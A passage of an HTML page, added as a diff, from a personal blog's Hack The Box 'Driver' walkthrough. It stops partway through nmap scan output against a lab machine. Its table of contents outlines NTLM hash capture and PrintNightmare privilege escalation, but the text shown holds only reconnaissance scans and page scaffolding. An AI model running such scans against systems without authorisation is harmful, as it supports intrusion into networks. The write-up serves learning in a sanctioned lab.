@@ -1,0 +1,1689 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.138.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Driver HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Driver HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/driver-box/" title="./driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Driver HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.12.11"
+                            >2024.12.11
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        9 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/responder/"
+                            class="tag-btn">
+                            Responder
+                        </a>
+                    
+                        <a
+                            href="/tags/cfs/"
+                            class="tag-btn">
+                            CFS
+                        </a>
+                    
+                        <a
+                            href="/tags/printnightmare/"
+                            class="tag-btn">
+                            PrintNightmare
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2021-1675/"
+                            class="tag-btn">
+                            CVE-2021-1675
+                        </a>
+                    
+                        <a
+                            href="/tags/download-cradle/"
+                            class="tag-btn">
+                            Download Cradle
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/driver-box/" class="bread-btn">
+    
+
+    
+        
+            Driver HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#driver-hack-the-box-walkthrough-writeup">Driver Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#rpc">RPC:</a></li>
+        <li><a href="#web-80">Web <code>80</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#using-an-scf-file-to-get-a-users-ntlm-hash">Using an SCF File to get a users NTLM hash:</a></li>
+        <li><a href="#cracking-tony-s-hash-with-hashcat">Cracking Tony&rsquo;s hash with hashcat:</a></li>
+        <li><a href="#enumerating-users-with-rpc">Enumerating Users with RPC:</a></li>
+        <li><a href="#enumerating-as-tony">Enumerating as Tony:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#discovering-the-host-is-vulnerable-to-printnightmare-cve-2021-1675">Discovering the host is vulnerable to PrintNightmare CVE-2021-1675:</a></li>
+        <li><a href="#adding-an-admin-user-using-printnightmare-cve-2021-1675">Adding an Admin User using PrintNightmare CVE-2021-1675:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="driver-hack-the-box-walkthrough-writeup">Driver Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Driver">https://app.hackthebox.com/machines/Driver</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20Walkthroughs/HTB/BlogEntriesMade/Driver/scans%20%20%f0%9f%8d%a3%20main%20%f0%9f%93%9d%20%c3%97139%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2009:49:09%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-11%2009:49%20GMT%0aNmap%20scan%20report%20for%2010.129.250.87%0aHost%20is%20up%20%280.038s%20latency%29.%0aNot%20shown:%20997%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20STATE%20SERVICE%0a80/tcp%20%20open%20%20http%0a135/tcp%20open%20%20msrpc%0a445/tcp%20open%20%20microsoft-ds%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%205.34%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans  🍣 main 📝 ×139🛤️  ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 09:49:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-11 09:49 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.250.87
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 5.34 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>RPC</li>
+<li>Web</li>
+<li>SMB</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li><strong>In depth scan TCP</strong>:
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%20Walkthroughs/HTB/BlogEntriesMade/Driver/scans%20%20%f0%9f%8d%a3%20main%20%f0%9f%93%9d%20%c3%97139%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2009:49:57%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20[sudo]%20password%20for%20kali:%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-11%2009:50%20GMT%0a%20%20Nmap%20scan%20report%20for%2010.129.250.87%0a%20%20Host%20is%20up%20%280.067s%20latency%29.%0a%20%20Not%20shown:%2065531%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20VERSION%0a%20%2080/tcp%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%2010.0%0a%20%20%7c_http-title:%20Site%20doesn%27t%20have%20a%20title%20%28text/html;%20charset=UTF-8%29.%0a%20%20%7c%20http-auth:%0a%20%20%7c%20HTTP/1.1%20401%20Unauthorized%5cx0D%0a%20%20%7c_%20%20Basic%20realm=MFP%20Firmware%20Update%20Center.%20Please%20enter%20password%20for%20admin%0a%20%20%7c%20http-methods:%0a%20%20%7c_%20%20Potentially%20risky%20methods:%20TRACE%0a%20%20%7c_http-server-header:%20Microsoft-IIS/10.0%0a%20%20135/tcp%20%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20445/tcp%20%20open%20%20microsoft-ds%20Microsoft%20Windows%207%20-%2010%20microsoft-ds%20%28workgroup:%20WORKGROUP%29%0a%20%205985/tcp%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%20%7c_http-title:%20Not%20Found%0a%20%20Warning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0a%20%20OS%20fingerprint%20not%20ideal%20because:%20Missing%20a%20closed%20TCP%20port%20so%20results%20incomplete%0a%20%20No%20OS%20matches%20for%20host%0a%20%20Service%20Info:%20Host:%20DRIVER;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0a%20%20Host%20script%20results:%0a%20%20%7c_clock-skew:%20mean:%206h59m58s,%20deviation:%200s,%20median:%206h59m58s%0a%20%20%7c%20smb2-security-mode:%0a%20%20%7c%20%20%203:1:1:%0a%20%20%7c_%20%20%20%20Message%20signing%20enabled%20but%20not%20required%0a%20%20%7c%20smb2-time:%0a%20%20%7c%20%20%20date:%202024-11-11T16:53:11%0a%20%20%7c_%20%20start_date:%202024-11-11T16:45:48%0a%20%20%7c%20smb-security-mode:%0a%20%20%7c%20%20%20account_used:%20guest%0a%20%20%7c%20%20%20authentication_level:%20user%0a%20%20%7c%20%20%20challenge_response:%20supported%0a%20%20%7c_%20%20message_signing:%20disabled%20%28dangerous,%20but%20default%29%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20186.52%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans  🍣 main 📝 ×139🛤️  ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 09:49:57 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-11 09:50 GMT
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.250.87
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.067s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65531</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>  80/tcp   open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>  |_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  | http-auth:
+</span></span><span style="display:flex;"><span>  | HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+</span></span><span style="display:flex;"><span>  |_  Basic realm<span style="color:#f92672">=</span>MFP Firmware Update Center. Please enter password <span style="color:#66d9ef">for</span> admin
+</span></span><span style="display:flex;"><span>  | http-methods:
+</span></span><span style="display:flex;"><span>  |_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc        Microsoft Windows RPC
